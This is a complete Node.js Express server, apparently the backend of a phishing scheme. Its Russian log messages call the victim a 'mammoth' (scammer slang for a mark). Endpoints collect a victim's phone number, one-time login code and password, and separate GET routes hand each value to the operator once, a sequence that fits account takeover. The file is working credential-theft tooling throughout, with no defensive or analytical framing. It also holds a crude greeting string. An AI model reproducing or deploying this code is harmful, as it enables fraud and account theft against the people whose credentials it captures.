const express = require('express');
const http = require('http');
const WebSocket = require('ws');

const app = express();
const port = 3000;

const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

app.use(express.json());

var pn;
var code;
var pass;

app.post('/phone', (req, res) => {
    const phone_number = req.body.phone_number;
    if (typeof phone_number !== 'undefined') {
        pn = phone_number;
        console.log(`Номер телефона мамонта: ${phone_number}`);
        res.json({ message: `Номер телефона мамонта: ${phone_number}` });
        return;
    } else {
        console.log('Номер телефона мамонта неопределен.');
        res.status(400).json({ error: 'Номер телефона мамонта неопределен.' });
        return;
    }
});

app.get('/getPhone', (req, res) => {
    if(pn){
        res.send(`Номер телефона мамонта: \n ${pn}`);
        pn = undefined;
        return 0;
    } else {
        res.status(404).send('Номер телефона мамонта не найден.');
        return 0;
    }
});

app.post('/authCode', (req, res) => {
    const value = req.body.value;
    if (typeof value !== 'undefined') {
        code = value;
        console.log(`Код мамонта: ${value}`);
        res.json({ message: `Код мамонта: ${value}` });
        return;
    } else {
        console.log('Код мамонта неопределен.');
        res.status(400).json({ error: 'Код мамонта неопределен.' });
        return;
    }
});

app.get('/getCode', (req, res) => {
    if(code){
        res.send(`Код мамонта:\n${code}`);
        code = undefined;
        return 0;
    } else {
        res.status(404).send('Код мамонта не найден.');
        return 0;
    }
});

app.post('/password', (req, res) => {
    const password = req.body.passwordInput;
    if (typeof password !== 'undefined') {
        pass = password;
        console.log(`Пароль мамонта: ${password}`);
        res.json({ message: `Пароль мамонта: ${password}` });
        return;
    } else {
        console.log('Пароль мамонта неопределен.');
        res.status(400).json({ error: 'Пароль мамонта неопределен.' });
        return;
    }
});

app.get('/getPassword', (req, res) => {
    if(pass){
        res.send(`Пароль мамонта: \n ${pass}`);
        pass = undefined;
        return;
    } else {
        res.status(404).send('Пароль мамонта не найден.');
        return;
    }
});

app.get('/', (req, res) => {
    res.send('Salam Alejkum, Denis Penis!');
});

wss.on('connection', function connection(ws) {
    console.log('WebSocket Server Connected');
  
    ws.on('message', function incoming(message) {
        console.log('Received:', message);
        // Пример ответа клиенту
        ws.send('Server received your message: ' + message);
    });
  
    ws.on('close', function close() {
        console.log('WebSocket Server Disconnected');
    });
});

server.listen(port, () => {
    console.log(`Сервер запущен на порту ${port}`);
});
